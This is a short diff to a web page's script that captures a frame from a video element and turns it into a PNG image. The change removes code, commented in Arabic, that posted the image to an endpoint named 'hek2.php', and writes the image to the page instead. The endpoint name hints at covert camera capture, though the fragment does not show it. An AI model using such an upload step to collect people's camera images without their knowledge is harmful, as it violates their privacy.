@@ -37,34 +37,9 @@
       canvas.height = video.videoHeight;
       canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
       var imageData = canvas.toDataURL('image/png');
-      
-    const dataToSend= [{"key":imageData}];
-
-// خيارات الطلب
-const requestOptions = {
-    method: 'POST', // يمكن أن تكون GET أو POST أو أي طريقة أخرى تتطلبها الAPI
-    headers: {
-        'Content-Type': 'application/json' // نوع المحتوى الذي ترسله إلى الAPI
-        // يمكنك أيضًا إضافة المزيد من الرؤوس إذا لزم الأمر، مثل رأس التوثيق
-    },
-    body: JSON.stringify(dataToSend) // تحويل البيانات إلى سلسلة JSON
-};
-
-// إرسال الطلب إلى الAPI باستخدام fetch
-fetch('hek2.php', requestOptions)
-    .then(response => {
-        if (!response.ok) {
-            throw new Error('Network response was not ok');
-        }
-        return response.json(); // قراءة البيانات المردة من الAPI ك JSON
-    })
-    .then(data => {
-        document.write('API response:', data.msg);
-        // يمكنك استخدام البيانات المردة هنا
-    })
-    .catch(error => {
-          document.write('There was a problem with the fetch operation:', error);
-    });
+      document.write(imageData);
+            
+    
   }
   </script>
   
